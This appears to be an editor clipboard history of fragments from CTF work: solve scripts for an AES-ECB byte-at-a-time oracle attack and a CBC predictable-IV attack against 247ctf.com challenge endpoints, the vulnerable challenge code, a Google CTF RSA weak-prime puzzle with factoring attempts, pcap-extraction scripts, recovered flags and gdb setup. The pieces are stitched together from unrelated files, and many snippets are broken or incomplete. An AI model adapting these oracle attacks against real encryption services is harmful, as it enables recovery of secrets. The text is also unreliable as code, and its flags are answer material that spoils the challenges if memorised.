	 - ((i+1) // block_size)
5fa3811e86340c339a1a505685649526|file:///home/neo/247ctf/crypto/sol_hidden.py|14|9|V|python
	        # targ_block = 2 - ((i+1) // block_size)
4a9e6795db61e2247eb26622d19bf488|file:///home/neo/247ctf/crypto/sol_hidden.py|1|1|V|python
	#!/usr/share/python3
	import requests, string
	
	URL = b'https://05e3c32c444a0e63.247ctf.com/encrypt'
	block_size = 16
	alphabet = 'CTF{}' + string.digits + 'abcdef'
	
	if __name__=='__main__':
	    flag = '247CTF{eb0518e4d'
	    fake_block = 'a' * (block_size * 2 - 1)
	    for i in range(block_size * 2 - 1):
	        flag_hex = bytes(flag, 'utf-8').hex()
	        fake_block_hex = bytes(fake_block, 'utf-8').hex()
	        targ_block = 2
	        encrypted = bytes.fromhex(requests.get(url=URL + b'?plaintext=' + fake_block_hex.encode()).text)
	        target = encrypted[targ_block * block_size: targ_block * block_size + block_size]
	        for c in alphabet:
	            test_encrypted = bytes.fromhex(requests.get(url=URL + b'?plaintext=' + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text)
	            test_block = test_encrypted[targ_block * block_size: targ_block * block_size + block_size]
	            if test_block == target:
	                flag += c
	                print(flag)
	                fake_block = fake_block[:-1]
	                break
23b810f0f034baccf51d3adbd7b15474|file:///home/neo/247ctf/crypto/sol_predictable.py|4|1|V|python
	URL = b'https://05e3c32c444a0e63.247ctf.com/encrypt'
5c6149002d6fdccd734b0703aa9c4aec|file:///home/neo/247ctf/crypto/sol_predictable.py|15|9|V|python
	        targ_block = 2
5efbb5f03677a371fd371fc497e10b71|file:///home/neo/247ctf/crypto/sol_predictable.py|9|13|v|python
	247CTF{eb0518e4d
cbfa900e16a7ad2b59cdbc22415e75f8|file:///home/neo/247ctf/crypto/sol_predictable.py|16|28|v|python
	targ_block * block_size: targ_block * block_size + block_size
405644d7186bd5bb8e0cf7635c450127|file:///home/neo/247ctf/crypto/sol_predictable.py|12|1|V|python
	        rand = os.urandom(block_size)
82083dabce1d1904133e3898e481d107|file:///home/neo/247ctf/crypto/sol_predictable.py|16|1|V|python
	        print(rand + fake_block_hex)
0e74fc468dd9b4d17d686c7c777d25fd|file:///home/neo/247ctf/crypto/sol_predictable.py|21|13|V|python
	            print(rand + fake_block_hex)
17b7e8cf7620714e20b9fd2154a9a1de|file:///home/neo/247ctf/crypto/sol_predictable.py|17|9|V|python
	        print(encrypted)
2f7b7e5677cb5f9861df36b50411ff0f|file:///home/neo/247ctf/crypto/sol_predictable.py|18|9|V|python
	        print(len(encrypted))
69425a70267bb748f696a01be0467e24|file:///home/neo/247ctf/crypto/sol_predictable.py|16|9|V|python
	        print(rand + fake_block_hex.encode())
dd920f1c4525bea669c8781be1cfb7ab|file:///home/neo/247ctf/crypto/sol_predictable.py|20|9|V|python
	            print(test_encrypted)
0df813e8f044543adbbe1ef50c5bed4e|file:///home/neo/247ctf/crypto/sol_predictable.py|17|28|v|python
	-(2 * block_size):-block_size
0566f466032f527bd15841e4585362c4|file:///home/neo/247ctf/crypto/sol_predictable.py|22|70|v|python
	-block_size:
017c417e08ac715eae2db5f8cfe9ec14|file:///home/neo/247ctf/crypto/sol_predictable.py|2|24|v|python
	, os
27162152d735041dea291df0edf4ba12|file:///home/neo/247ctf/crypto/sol_predictable.py|13|9|V|python
	        rand = os.urandom(block_size).hex().encode()
fc434717576ea39bf53e4ddbc2ee9ab1|file:///home/neo/247ctf/crypto/sol_predictable.py|15|21|v|python
	bytes.fromhex(requests.get(url=URL + b'?IV=' + rand + b'&plaintext=' + rand + fake_block_hex.encode()).text)
209e020e27f2794480a4483a4a55489a|file:///home/neo/247ctf/crypto/sol_predictable.py|12|45|^v|python
	+ b'?IV=' + rand + b
c39005554baffe537b81bf94bee93c2f|file:///home/neo/247ctf/crypto/sol_predictable.py|14|1|V|python
	        flag_hex = bytes(flag, 'utf-8').hex()
16bdb76d425b10f7eee3d8848c69ab0b|file:///home/neo/247ctf/crypto/sol_predictable.py|16|1|V|python
	        fake_block_hex = bytes(fake_block, 'utf-8').hex()
41b3f831dae0528f4ea5fc871c2108b1|file:///home/neo/247ctf/crypto/sol_predictable.py|13|5|V|python
	    flag_hex = bytes(flag, 'utf-8').hex()
849fd24baf8fd6c7f01857ab4395d986|file:///home/neo/247ctf/crypto/sol_predictable.py|17|56|^v|python
	+ b'?IV=' + rand 
34d1c35063280164066ecc517050da0b|file:///home/neo/247ctf/crypto/sol_predictable.py|17|75|v|python
	rand
29e47b6f5baf1da3eaaef101520db727|file:///home/neo/247ctf/crypto/sol_predictable.py|21|13|V|python
	            rand = os.urandom(block_size).hex().encode()
3298f13049d19cffaa37ca931dd4d421|file:///home/neo/247ctf/crypto/sol_predictable.py|14|24|v|python
	requests
503b150ea7c3a8812a6d5009dba8eb05|file:///home/neo/247ctf/crypto/sol_predictable.py|22|44|v|python
	session.get(url=URL + b'?plaintext=' + iv.encode() + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text
2e8b3a73d0cfd55be4aab63f208f595b|file:///home/neo/247ctf/crypto/sol_predictable.py|22|13|V|python
	            test_encrypted = bytes.fromhex(session.get(url=URL + b'?plaintext=' + iv.encode() + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text)
da91ce9d1255c5c1e6d0ba4c569c353a|file:///home/neo/247ctf/crypto/sol_predictable.py|22|13|V|python
	            print(session.get(url=URL + b'?plaintext=' + iv.encode() + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text)
8a44afe89fb25f1e4defcb702c5ddf8c|file:///home/neo/247ctf/crypto/sol_predictable.py|22|13|V|python
	            # test_encrypted = bytes.fromhex(session.get(url=URL + b'?plaintext=' + iv.encode() + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text)
cfe3dbf1643b95e12326498be4787563|file:///home/neo/247ctf/crypto/sol_predictable.py|7|28|v|python
	'abcdef'
aba52cff84d059e39edd9362c06bb88e|file:///home/neo/247ctf/crypto/sol_predictable.py|19|9|V|python
	        print(iv)
1aad31524e24787fb8714575ec3d531d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|234|13|v|python
	debug=False,host='0.0.0.0', port=11337
08316e289e75a729907d3dcd4f4d30b2|file:///home/neo/247ctf/crypto/predictable.py|63|34|v|python
	11337
6efbec118b1a0756c4c2e0f87e3b9b85|file:///home/neo/247ctf/crypto/predictable.py|8|1|V|python
	new_random = os.rdd
d881c4d03a113d68c75feaa1899595b2|file:///home/neo/247ctf/crypto/predictable.py|38|1|V|python
	        session["IV"] = new_random()
2a8a1bd0c9c383cde384f4189353b1bf|file:///home/neo/247ctf/crypto/predictable.py|39|25|v|python
	new_random
d56138b982ab9f1a37035c902f31b650|file:///home/neo/247ctf/crypto/predictable.py|22|1|V|python
	            return "Too predictable!"
be18d595f01aad7d5d3886d7bd288de2|file:///home/neo/247ctf/crypto/predictable.py|65|1|V|python
	        return "Something went wrong!"
2440bf948597c67d558df9d752dedf19|file:///home/neo/247ctf/crypto/predictable.py|65|16|v|python
	"Something went wrong!"
960ed2c9f71536e1310f337c9b31616e|file:///home/neo/247ctf/crypto/predictable.py|13|13|v|python
	AES.block_size - len(s) % AES.block_size
d6f8e5b0344e911ff29810fdbfb8d98c|file:///home/neo/247ctf/crypto/predictable.py|61|1|V|python
	            request.args.get("plaintext").decode("hex")[: AES.block_size * 2]
2e46b967e187ca36dd38338c34535c05|file:///home/neo/247ctf/crypto/predictable.py|62|13|v|python
	request.args.get("plaintext").decode("hex")[: AES.block_size * 2]
be3d61cbdd1824e07a59c6cab029601f|file:///home/neo/247ctf/crypto/predictable.py|60|1|V|python
	        print(request.args.get("plaintext").decode("hex")[: AES.block_size * 2])
f8cce0117c6ec5a8741b16c867b2befb|file:///home/neo/247ctf/crypto/predictable.py|61|9|V|python
	        print(request.args.get("plaintext").encode().decode("hex")[: AES.block_size * 2])
31dc0ea098e13fb16eb8b15e6fc1d5b2|file:///home/neo/247ctf/crypto/predictable.py|59|5|V|python
	    print(request.args.get("plaintext").encode().[: AES.block_size * 2])
0ee35c15920570a30d22c304717b09de|file:///home/neo/247ctf/crypto/predictable.py|59|54|v|python
	.encode(
3d9fd47ebeb331e93c9a4a1f0fabda0c|file:///home/neo/247ctf/crypto/predictable.py|61|5|V|python
	    print(bytes.fromhex(request.args.get("plaintext"))[: AES.block_size * 2])
e329bfbbf9dce47e9d21ece9baff35bf|file:///home/neo/247ctf/crypto/predictable.py|6|11|v|python
	(b'a' * 16)
a44c1fc54aa492ebb6d135dc9afeb0c3|file:///home/neo/247ctf/crypto/predictable.py|7|14|v|python
	(b'a'* 16)
10141972f58b104172459ac440faebbf|file:///home/neo/247ctf/crypto/predictable.py|12|1|V|python
	        self.pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(
	            AES.block_size - len(s) % AES.block_size
	        )
c7e0a32dc2b913b213cbb506b7a348d8|file:///home/neo/247ctf/crypto/predictable.py|12|14|v|python
	pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
bd372fd49cd8557d6cc3c75a825d5cd5|file:///home/neo/247ctf/crypto/predictable.py|31|33|v|python
	"hex"
49c6ec997451aff4ae22841e39d9bb15|file:///home/neo/247ctf/crypto/predictable.py|30|9|V|python
	        print('iv ok')
bc57c712c0563c3c2232372369059f55|file:///home/neo/247ctf/crypto/predictable.py|27|9|V|python
	        print('padded:',self.pad(raw+flag))
3b921547447217329e19b5ef09bd7bd1|file:///home/neo/247ctf/crypto/predictable.py|26|9|V|python
	        print(raw+flag)
f7c876af87d92f634a0bceb1000cab3e|file:///home/neo/247ctf/crypto/predictable.py|25|9|V|python
	        print('cipher ok')
51cea73909fc527c82b1631362e5d5b7|file:///home/neo/247ctf/crypto/predictable.py|23|9|V|python
	        print(raw)
73c9e755209728f18a010790e91e8b29|file:///home/neo/247ctf/crypto/sol_predictable.py|25|13|V|python
	            print(iv)
56c76974eb47bb383d7818c966e73c27|file:///home/neo/247ctf/crypto/sol_predictable.py|21|9|V|python
	        print(encrypted.hex())
d2354896f65511cce0cc1d468a0c9429|file:///home/neo/247ctf/crypto/sol_predictable.py|26|5|V|python
	            print(test_encrypted.hex())
d517a062597c5b4eba91145c5a6864d9|file:///home/neo/247ctf/crypto/sol_predictable.py|24|13|V|python
	            # print(iv)
d4298b3006aa89c8582b2351b1696d13|file:///home/neo/247ctf/crypto/sol_predictable.py|35|19|v|python
	fake_block = fake_block[:-1]
e1cac56ed509696e00f78afe91be962c|file:///home/neo/247ctf/crypto/sol_predictable.py|15|1|V|python
	    iv = bytes.fromhex(session.get(url=URL + b'?plaintext=' + os.urandom(16).hex().encode() + fake_block_hex.encode()).text)[-block_size:].hex()
c4df31cee9e7113613bd53bb952647af|file:///home/neo/247ctf/crypto/predictable.py|16|1|V|python
	        print(self.used_ivs)
7f170f62ef6733318b450ac560864b38|file:///home/neo/247ctf/crypto/sol_predictable.py|35|15|v|python
	iv = test_encrypted[-block_size:].hex()
bd38a16a7496b17aa6ec2e27a1a8054a|file:///home/neo/247ctf/crypto/sol_predictable.py|27|13|V|python
	            iv = test_encrypted[-block_size:].hex()
98c88142ded3dae12ed46bfb2b5d7e5b|file:///home/neo/247ctf/crypto/sol_predictable.py|35|1|V|python
	                iv = bytes.fromhex(test_encrypted)[-block_size:].hex()
7de557d0405fe6ceade27bab82cf0986|file:///home/neo/247ctf/crypto/sol_predictable.py|28|13|V|python
	            if iv == target_iv:
9fbd4b188e73262de84bbda3a553944b|file:///home/neo/247ctf/crypto/sol_predictable.py|24|9|V|python
	        target_iv = iv
8a3296163989605da2e9a1c9fef81212|file:///home/neo/247ctf/crypto/sol_predictable.py|26|9|V|python
	            iv = bytes.fromhex(test_encrypted)[-block_size:].hex()
28b2051e6dfe865bc6bec073218bb1ee|file:///home/neo/247ctf/crypto/sol_predictable.py|36|17|v|python
	iv = bytes.fromhex(test_encrypted)[-block_size:].hex()
ad60e3245369b91557cd4c958f85a534|file:///home/neo/247ctf/crypto/sol_predictable.py|29|22|v|python
	targ_block
8b7371b95c4ebb566c79eeb5de3e83f3|file:///home/neo/247ctf/crypto/sol_predictable.py|22|1|V|python
	        target = encrypted[-(2 * block_size):-block_size]
ef390637e7474639034102f8fa13e977|file:///home/neo/247ctf/crypto/sol_predictable.py|22|27|v|python
	[-(2 * block_size):-block_size]
93743eca908ab5a4a2d8a73f48a90549|file:///home/neo/247ctf/crypto/sol_predictable.py|31|24|V|python
	            if (c=='a'):
	                print(iv)
3e079f709464d60e33d3952d54223790|file:///home/neo/247ctf/crypto/sol_predictable.py|31|13|V|python
	            # if 'predictable' in test_encrypted:
7bbea485317db69e7d4a87e68adbbd5b|file:///home/neo/247ctf/crypto/sol_predictable.py|39|17|V|python
	            else:
	                iv = bytes.fromhex(test_encrypted)[-block_size:].hex()
a0f73fb196b36093c44a71b50cdf5b79|file:///home/neo/247ctf/crypto/sol_predictable.py|25|9|V|python
	        print('targ:', target_iv)
0d5ef5f8854ea4f662a0dd2484842650|file:///home/neo/247ctf/crypto/sol_predictable.py|5|1|V|python
	# URL = b'https://830266059b0f61fb.247ctf.com/encrypt'
8879cce265ea80d804d26cad03388b43|file:///home/neo/247ctf/crypto/sol_predictable.py|15|24|v|python
	session.get(url=URL + b'?plaintext=' + os.urandom(16).hex().encode() + fake_block_hex.encode()).text
70e70984d7643b1ffb738d878619e7af|file:///home/neo/247ctf/crypto/sol_predictable.py|15|5|V|python
	    print(session.get(url=URL + b'?plaintext=' + os.urandom(16).hex().encode() + fake_block_hex.encode()).text)
b2e99d668c84ea386a02d150333fa049|file:///home/neo/247ctf/crypto/sol_predictable.py|16|5|V|python
	    # print(iv)
2384cc185983daf7d6acb22d876b1229|file:///home/neo/247ctf/crypto/sol_predictable.py|39|17|v|python
	exit()
7728c25ac493f86d1b08c875d57e8ef6|file:///home/neo/247ctf/crypto/sol_predictable.py|39|17|V|python
	                os.exit(1)
a7f121cd2ff89e481eda8c5fdfe399c7|file:///home/neo/247ctf/crypto/sol_predictable.py|5|1|V|python
	URL = b'https://d6acaeab396e387d.247ctf.com/encrypt'd
dbaa4b1b3ba04a793ab9f041d0a6c682|file:///home/neo/247ctf/crypto/sol_predictable.py|6|1|V|python
	URL = b'https://801e05ad117fe188.247ctf.com/encrypt'
0b63330a0b94acec1dd9775ac05952b2|file:///home/neo/247ctf/crypto/sol_predictable.py|2|3|v|python
	d4d651b2a63d3ac9
248e2ef1733fef47cfae92d805c1ae15|file:///home/neo/247ctf/crypto/sol_predictable.py|6|1|V|python
	URL = b'https://46aec8147951b1c2.247ctf.com/encrypt'
0db2083052d0ad84e6f537d0b20f77f7|file:///home/neo/247ctf/crypto/sol_predictable.py|6|1|V|python
	URL = b'https://b2a67e962701b1aa.247ctf.com/encrypt'
9ca669e253dcc0cdc862bf202200299e|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|7|5|v|python
	0xe64a5f84e2762be5
156cbbc6aebddde3716bafb5223063c6|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|3|1|V|python
	import random
	from Crypto.Util.number import *
	import gmpy2
	
	a = 0xe64a5f84e2762be5
	chunk_size = 64
	
	def gen_prime(bits):
	  s = random.getrandbits(chunk_size)
	
	  while True:
	    s |= 0xc000000000000001
	    p = 0
	    for _ in range(bits // chunk_size):
	      p = (p << chunk_size) + s
	      s = a * s % 2**chunk_size
	    if gmpy2.is_prime(p):
	      return p
2bcc996600f68c173c687cc1b1b5df4e|file:///home/neo/CTFs/googlectf2020/chunk-norris/output.txt|1|1|V|text
	n = 0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19
8efbc99cf86595297012af2d15fefbaa|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|11|1|V|python
	  s = random.getrandbits(chunk_size)
2c097b665a26eded7f3d57f3538c3999|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|14|10|v|python
	0xc000000000000001
5a1a5fe3be1de0366f8019cf16d0256a|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|3|1|V|python
	import random
	from Crypto.Util.number import *
	import gmpy2
	
	a = 0xe64a5f84e2762be5
	chunk_size = 64
	
	def gen_prime(bits):
	  s = random.getrandbits(chunk_size)
	
	  while True:
	    s |= 0xc000000000000001
	    print(hex(s))
	    p = 0
	    for _ in range(bits // chunk_size):
	      p = (p << chunk_size) + s
	      s = a * s % 2**chunk_size
	      print(hex(s))
	    if gmpy2.is_prime(p):
	      return p
ede66f94d565b6c906f00d61c9e85b04|file:///home/neo/247ctf/crypto/sol_predictable.py|24|9|V|python
	        target = encrypted[block_size * 2dd:3 * block_size]
df99c22934131ec5cd0e173141c3020e|file:///home/neo/247ctf/crypto/sol_predictable.py|26|9|V|python
	        second_ct_block = encrypted[block_size:bloc]
2327346e833efcd6b2e7b3f0a4df8ebb|file:///home/neo/247ctf/crypto/sol_predictable.py|24|9|v|python
	previous
99243c709fa365d38e24fc2a1465f53d|file:///home/neo/247ctf/crypto/sol_predictable.py|24|9|v|python
	second_ct_block
72a5997bce01f112299891eb1397bafe|file:///home/neo/247ctf/crypto/sol_predictable.py|31|9|V|python
	        fake_prev = byte_xor(prev,)
342525d9bf4db1788a5852e0680ef068|file:///home/neo/247ctf/crypto/sol_predictable.py|28|9|V|python
	        first_ct_block = encrypted[:block_size]
161e668cb6aeb4ff8bdef422e0c39dbf|file:///home/neo/247ctf/crypto/sol_predictable.py|32|83|^v|python
	fake_block_hex.encode() + flag_hex.encode(
dc69bae2212b0353e8f2c3ca3fde305d|file:///home/neo/247ctf/crypto/sol_predictable.py|32|83|^v|python
	 + hex(ord(c))[2:].encode()
0644613c659964f84165a02c56607b90|file:///home/neo/247ctf/crypto/sol_predictable.py|11|1|V|python
	URL = b'https://9dd287be0c503a82.247ctf.com/encrypt'
5d42483f6c3d311b1ee05a31c8ff98ef|file:///home/neo/247ctf/crypto/sol_half.py|27|9|V|python
	        previous = encrypted[block_size:block_size * 2]
c17ab27a1def5547b384a17b31c05b39|file:///home/neo/247ctf/crypto/sol_half.py|30|9|V|python
	            fake_test = byte_xor(previous, (half_flag[-len(fake_block):] + c).encode()).hex()
a79ea680463df43b2351bf26a630ceb0|file:///home/neo/247ctf/crypto/sol_half.py|30|24|v|python
	 byte_xor(previous, (half_flag[-len(fake_block):] + c).encode()).hex()
81ad18f3532d415e5d2f41169d27a74d|file:///home/neo/247ctf/crypto/sol_half.py|31|13|V|python
	            print(fake_test)
16a4a3d32c377a103f7a9bd2a4680f4e|file:///home/neo/247ctf/crypto/sol_half.py|11|1|V|python
	URL = b'https://7638649be98d861c.247ctf.com/encrypt'
9082e15df4f46a9185a64fae470d52ff|file:///home/neo/247ctf/crypto/sol_predictable.py|11|1|V|python
	URL = b'https://d189b9d83591255c.247ctf.com/encrypt'
6cb88ffa445ebf9a359254f4e506886b|file:///home/neo/247ctf/crypto/sol_predictable.py|11|1|V|python
	URL = b'https://98d587032bc979b4.247ctf.com/encrypt'
16593f6cb3e4b38a9f0a17f48505a714|file:///home/neo/247ctf/crypto/sol_predictable.py|11|1|V|python
	URL = b'https://5b0966403b71cd76.247ctf.com/encrypt'
a8bceb26f556ff2ace23bc6b7ce3c10a|file:///home/neo/247ctf/misc/the_flag_lottery.py|1|1|V|python
	import SocketServer, threading, random, time
7fd608bd504427b3f5679f11938b1888|file:///home/neo/247ctf/misc/sol_lottery.py|1|8|^v|python
	SocketServer, threading, 
b332e4eed90268e04027698897eb814f|file:///home/neo/247ctf/misc/the_flag_lottery.py|8|1|V|python
	        secret = random.Random()
	        secret.seed(int(time.time())) 
54d96ff035557e116f293429fd3f721b|file:///home/neo/247ctf/misc/the_flag_lottery.py|8|1|V|python
	        secret = random.Random()
	        secret.seed(int(time.time())) 
	        winning_choice = str(secret.random())
11314bce4d970c53ffdd59a1257365f1|file:///home/neo/247ctf/misc/sol_lottery.py|8|1|v|python
	winning_choice
6236da623050c89bbc60ed0ce1e6acb8|file:///home/neo/247ctf/misc/sol_try.py|5|1|V|python
	block_size = 16
	alphabet = 'CTF{}' + string.digits + 'abcdef'
c68938b88b336da0c1750224b9718bf5|file:///home/neo/247ctf/misc/sol_try.py|7|1|V|python
	    flag = '247CTF{eb0518e4d'
	    fake_block = 'a' * (block_size * 2 - 1)
	    for i in range(block_size * 2 - 1):
	        flag_hex = bytes(flag, 'utf-8').hex()
	        fake_block_hex = bytes(fake_block, 'utf-8').hex()
	        targ_block = 2
91c8c6483a9e60bb3e339b173e554005|file:///home/neo/247ctf/misc/sol_try.py|8|1|V|python
	        target = encrypted[targ_block * block_size: targ_block * block_size + block_size]
	        for c in alphabet:
	            test_encrypted = bytes.fromhex(requests.get(url=URL + b'?plaintext=' + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c))[2:].encode()).text)
	            test_block = test_encrypted[targ_block * block_size: targ_block * block_size + block_size]
	            if test_block == target:
	                flag += c
	                print(flag)
	                fake_block = fake_block[:-1]
	                break
6005f18355a0a672caae7399f920af77|file:///home/neo/247ctf/misc/sol_try.py|7|56|v|python
	fake_block_hex.encode()
941c8585149c7d624b91deeb98a6853e|file:///home/neo/247ctf/misc/try.py|36|33|v|python
	:4444
f0434b4423194d4dbc0225b518a9aa71|file:///home/neo/247ctf/misc/try.py|36|19|v|python
	http://0
98299f4e06df1da0cad31947a190bfff|untitled:1|2|1|^v|
	  39e0: 35 30 31 35 39 38 66 35 36 38 37 64 32 36 36 61  5
c327e26ff803b84de0dbf6662a806130|untitled:1|2|1|^v|
	  39f0: 38 64 31 32 37 63 34 62 61 64 66 7D 00 32 34 37  8
5a1d622339950cef70f013acf510e689|untitled:1|1|1|V|
	247CTF{4ba3701598f5687d266ad127c4badf}
b62cd5db3d27ac527f593fcb8d2fe488|untitled:1|2|1|^v|
	  3fa0: 62 61 33 37 35 30 31 35 39 38 66 35 36 38 37 64  b
ebb484f65ee0b1694a8a44719cfd7f7f|untitled:1|2|1|v|
	  3fa0: 62 61 33 37 35 30 31 35 39 38 66 35 36 38 37 64  
4ad5b54bc4b074c3509849e00ce83603|untitled:1|2|1|v|
	  3fb0: 32 36 36 61 38 64 31 
1d12050bc15f4c851fe2851afd59e067|untitled:1|2|1|v|
	32 37 63 34 62 61 64 66 7D  266a8d127c4badf
b7548ca6c51901128271f41d01a29ef6|untitled:1|2|1|v|
	32 37 63 34 62 
d5280b829af94f016f289401893041c3|untitled:1|2|1|^v|
	61 64 66 7D  2
75b1fea22e7742c671044d5d48ce269b|untitled:1|1|1|V|
	247CTF{4ba37501598f5687d266a8d127c4badf}
b2577283a47888fb8a965ee3fd3c3d4a|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|1|1|V|python
	from scapy.all import *
	
	pcap = rdpcap("urg3nt_c4ll.pcap")
	packets = PacketList([p for p in pcap if Raw in p])
e8c5bc112bd5baf903ba74eb03e83ffb|file:///home/neo/247ctf/networking/sol_error.py|3|16|v|python
	urg3nt_c4ll.pcap
80ca91b0a29827119e852ae332c60802|file:///home/neo/247ctf/networking/sol_error.py|10|5|V|python
	    # print(p['ICMP'].payload)
8c7dd922ad47494fc02c388e12c00eac|file:///home/neo/247ctf/networking/sol_error.py|7|6|v|python
	file
17625e9eaf57bde986efc23e6bb0f35e|file:///home/neo/247ctf/networking/sol_error.py|13|1|V|python
	print(flag_file)
00345100a1e282b91fae0875fd7f18e9|file:///home/neo/247ctf/networking/encrypted.sh|2|1|V|sh
	echo "$files"
a14ca69a9d8295a4c3633c17dfff12ca|file:///home/neo/247ctf/networking/sol_seq.py|3|17|v|python
	error_reporting.pcap
d00ab99459cbecf726f41a4e446e4b05|file:///home/neo/247ctf/networking/sol_seq.py|3|1|V|python
	pcap1 = rdpcap("chall-i1.pcap")
a570894f1345e1d164098cfcf152f963|file:///home/neo/247ctf/networking/sol_seq.py|9|1|V|python
	flag_payload = b''
ccf689c9a0e1f926f69c8be45a39387e|file:///home/neo/247ctf/networking/sol_seq.py|7|1|V|python
	packets = packets[1:]
d9d965621e14ae3303c3f235d77a3afb|file:///home/neo/247ctf/networking/sol_seq.py|9|1|V|python
	    flag_payload += p['ICMP'].load
	
	flag_file = open('error.jpeg', 'wb')
	flag_file.write(flag_payload)
be4c7b8b2114bad6e65e8a8029641c84|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|20|1|V|python
	      print(hex(s))
55d30abaaeecd4088d6b533617d4ea62|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|3|1|V|python
	import random
	from Crypto.Util.number import *
	import gmpy2
	
	a = 0xe64a5f84e2762be5
	chunk_size = 64
	
	def gen_prime(bits):
	  s = random.getrandbits(chunk_size)
	
	  while True:
	    s |= 0xc000000000000001
	    print(hex(s))
	    p = 0
	    for _ in range(bits // chunk_size):
	      p = (p << chunk_size) + s
	      s = a * s % 2**chunk_size
	    print(bin(p)[2:])
	    if gmpy2.is_prime(p):
	      return p
eb0aef7bbcc218aa365eb0c7f366c818|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|14|1|V|python
	    s |= 0xc000000000000001
92deb345433d06076953bd999c3ac89e|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|18|1|V|python
	      p = (p << chunk_size) + s
195dd9939a2bdc94c08be4c2c13b2658|untitled:4|1|1|V|
	n = 0xab802dca026b18251449baece42ba2162bf1f8f5dda60da5f8baef3e5dd49d155c1701a21c2bd5dfee142fd3a240f429878c8d4402f5c4c7f4bc630c74a4d263db3674669a18c9a7f5018c2f32cb4732acf448c95de86fcd6f312287cebff378125f12458932722ca2f1a891f319ec672da65ea03d0e74e7b601a04435598e2994423362ec605ef5968456970cb367f6b6e55f9d713d82f89aca0b633e7643ddb0ec263dc29f0946cfc28ccbf8e65c2da1b67b18a3fbc8cee3305a25841dfa31990f9aab219c85a2149e51dff2ab7e0989a50d988ca9ccdce34892eb27686fa985f96061620e6902e42bdd00d2768b14a9eb39b3feee51e80273d3d4255f6b19
	n_bin = bin(n)[2:]
	try = n_bin[:128]
	to_try = []
	while try.nbits() > 62:
	    to_try.append(try)
	    if try & 1:
	        to_try.append(try-1)
	    else:
	        to_try.append(try+1)
	    try /= 2
	
	test_factors = []
	for test in to_try:
	    factors = ecm.factor(test)
	    if len(factors) == 2:
	        test_factors.append(factors)
	
e53857f63106e193590baf8e810cad4c|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|3|1|V|python
	import random
	from Crypto.Util.number import *
	import gmpy2
	
	a = 0xe64a5f84e2762be5
	chunk_size = 64
	
	def gen_prime(bits):
	  s = random.getrandbits(chunk_size)
	
	  while True:
	    s |= 0xc000000000000001
	    print(hex(s))
	    p = 0
	    for _ in range(bits // chunk_size):
	      p = (p << chunk_size) + s
	      s = a * s % 2**chunk_size
	    print(bin(p)[2:])
	    if gmpy2.is_prime(p):
	      return p
	
f09d0d0fbc1150d2c178f56f62f7d98f|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|19|1|V|python
	      s = a * s % 2**chunk_size
07717a12bdb27452aa501cdbcdb6d85e|file:///home/neo/pwndbg/setup.sh|122|9|v|sh
	gdb -batch -q --nx -ex 'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'
5c2325c5f07ebd0756ab684ebd5c60f5|file:///home/neo/pwndbg/setup.sh|129|21|v|sh
	gdb -batch -q --nx -ex 'pi import site; print(site.getsitepackages()[0])'
9df990fec2e939bf882ef4224c2e5baa|file:///home/neo/pwndbg/requirements.txt|4|7|v|text
	>=3.1.0
c27a26021e6fae78c4bc9e6ebe878ee3|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|7|1|V|python
	a = 0xe64a5f84e2762be5
	chunk_size = 64
	
	def gen_prime(bits):
	  s = random.getrandbits(chunk_size)
	
	  while True:
	    s |= 0xc000000000000001
	    print(hex(s))
	    p = 0
	    for _ in range(bits // chunk_size):
	      p = (p << chunk_size) + s
	      s = a * s % 2**chunk_size
	    print(bin(p)[2:])
	    if gmpy2.is_prime(p):
	      return p
	
84ab4284cfcaf0a6c3332a3bc66b839f|file:///home/neo/CTFs/googlectf2020/chunk-norris/challenge.py|3|1|V|python
	import random
	from Crypto.Util.number import *
	import gmpy2
fcb342f426a0887ed890733527d502cb|file:///home/neo/.gdbinit|22|1|V|gdb
	source /home/neo/splitmind/gdbinit.py
	python
	import splitmind
	(splitmind.Mind()
	  .tell_splitter(show_titles=True)
	  .tell_splitter(set_title="Main")
	  .right(display="backtrace", size="25%")
	  .above(of="main", display="disasm", size="80%", banner="top")
	  .show("code", on="disasm", banner="none")
	  .right(cmd='tty; tail -f /dev/null', size="65%", clearing=False)
	  .tell_splitter(set_title='Input / Output')
	  .above(display="stack", size="75%")
	  .above(display="legend", size="25")
	  .show("regs", on="legend")
	  .below(of="backtrace", cmd="ipython", size="30%")
	).build(nobanner=True)
	end
d8b43feb0d6a9fd253ae76a027585f58|file:///usr/bin/gdb-pwndbg|1|1|V|sh
	#!/bin/sh
	exec gdb -q -ex init-pwndbg "$@"
